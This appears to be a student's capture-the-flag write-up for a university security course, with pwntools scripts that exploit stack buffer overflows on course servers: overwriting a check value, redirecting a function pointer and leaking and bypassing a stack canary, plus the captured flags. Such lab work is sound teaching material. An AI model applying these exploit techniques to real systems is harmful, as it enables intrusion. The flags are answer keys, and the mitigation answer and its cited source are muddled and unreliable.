## Exercise 00:

The vulnerability found in this exercise is buffer overflow where when overflowing we can change a value in the stack.

### Source code:

```Python
from pwn import *

context.log_level = 'debug'

io = remote('inf226.puffling.no', 7000)

# Since the buffer at 00.c is 16 we fill this buffer
overFlow = bytes(4*'aaaa', 'utf-8')

payLoad = p64(0x79beef8b)

print(io.recvline())

print(overFlow + payLoad)

# Now since we are able to write up 
# to 512 bytes we are able to overflow the buffer
io.sendline(overFlow + payLoad)

# Recive information untill there is a silence
print(io.recvuntil(':', timeout=1))
```

So in this program the buffer is at 16 bytes so if we are able to 
write more than 16 bytes (which we can) we are able to access the 
rest of the stack. And here in this program there is an if statement that
checks if the value of locals.check == 0x79beef8b. So here we want to change the
value to 0x79beef8b. So we overflow the buffer untill we are at locals and write
this value to be 0x79beef8b.

#### Flag:
```
b'INF226{s3cR3t_f1Agz}\n'
```

## Exercise 01:

In this exercise we still have the buffer overflow but instead of a value we
need to overwrite a function pointer

### Source code:

```Python
from pwn import *

context.log_level = 'debug'

io = remote('inf226.puffling.no', 7001)

# Again the buffer is at 16 bytes
overFlow = bytes(4*'aaaa', 'utf-8')

# The function pointer's memory address
payLoad = p64(0x00000000004011f6)

print(io.recvline())

print(overFlow + payLoad)
io.sendline(overFlow + payLoad)

print(io.recvuntil(':', timeout=1))
```

In this program the buffer is still at 16 and from the C program we 
can see that the program never runs the function getFlag() and thus we
are never able to get to the flag just by running the program. So in this
exercise we need to locate the memory address to getFlag() and overflow
the buffer to run this function instead of the ordinary program. 
So using the command:
```
objdump -d 01 | grep getFlag
```
I got the memory address for the function getFlag() and used this as the payload
for my buffer overflow exploit.

#### Flag:
```
b'INF226{2b_0r_!2b}\n'
```

## Exercise 02:

In this exercise, again, we have the buffer overflow exploit, but in this instance
we have a canary that stands between the buffer and where the payload needs to be.

### Source code:

```Python
from pwn import *

context.log_level = 'debug'

io = remote('inf226.puffling.no', 7002)

# Again the buffer is at 16 bytes
buffer = 16
padding = 8
canary_distance = b'24'

io.recvline()
io.sendline(canary_distance)

canary = io.recvline().decode()
canary = int(canary, 16)
payload = p64(0x401236)

io.sendline(b'a' * (buffer+padding) + p64(canary) + b'a' * padding + payload)

print(io.recvuntil(':', timeout=1))
```

In this exercise we have the same problem as the last exercise, 
but now there is a canary between the buffer and the payload destination.
So we first find the canary which is 8 bytes after the buffer, which we can 
see at objdump and gdb. We can see it from gdb because, since the canary is 
set to a random value each time we run the program. And now since we know that the
canary is 8 bytes after the buffer(16) we input "24" when asked what does the canary say.
Then we will get the canary in the next io.recvline(). Then we can use this value to
buffer overflow past the canary and set the canary's value back to itself while sneaking a payload past the canary.

#### Flag:
```
b'INF226{s3r1nu5_cAnar1a}\n'
```

##### What sort of mitigation technique is in use here? How could you prevent this attack?
> The idea behind using a canary is that an attacker attempting to mount a stack-smashing attack will have to 
overwrite the canary to overwrite the control flow information. By choosing a random value for the canary, the attacker 
cannot know what it is and thus cannot include it in the data used to “smash” the stack.
[Source](https://economictimes.indiatimes.com/definition/mitigation)

The sort of mitigation technique in use in this program is a canary, this is to detect if there 
is a buffer overflow exploit happening.
Now to prevent this attack from happening the program probably just should print out the
value of the program.

## Exercise 03:

In this exercise you do something relatable to the exercise 02, but in this instance you don't know exactly where the canary is so you need to loop through the whole memory line between 0x7ffffffff000–0x7fffffffb000.
